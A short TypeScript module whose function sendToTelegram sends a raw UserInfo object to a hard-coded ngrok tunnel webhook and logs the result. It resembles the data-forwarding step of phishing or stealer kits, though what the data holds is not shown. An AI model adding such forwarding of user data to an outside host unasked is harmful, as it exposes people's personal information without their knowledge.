import { UserInfo } from './userInfo';

  // Send user data directly to your bot's webhook
  export async function sendToTelegram(userInfo: UserInfo): Promise<boolean> {
    const webhookUrl = 'https://800d-217-138-162-43.ngrok-free.app/webhook/userinfo';
    
    try {
      // Send the raw userInfo object as JSON to bot's webhook endpoint
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(userInfo),
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Failed to send data to bot:', {
          status: response.status,
          statusText: response.statusText,
          errorText,
        });
        return false;
      }

      console.log('User data sent successfully to bot');
      return true;
    } catch (error: unknown) {
      if (error instanceof Error) {
        console.error('Error sending data to bot:', {
          message: error.message,
          name: error.name,
          stack: error.stack,
        });
      } else {
        console.error('Unknown error sending data to bot:', error);
      }
      return false;
    }
      

  }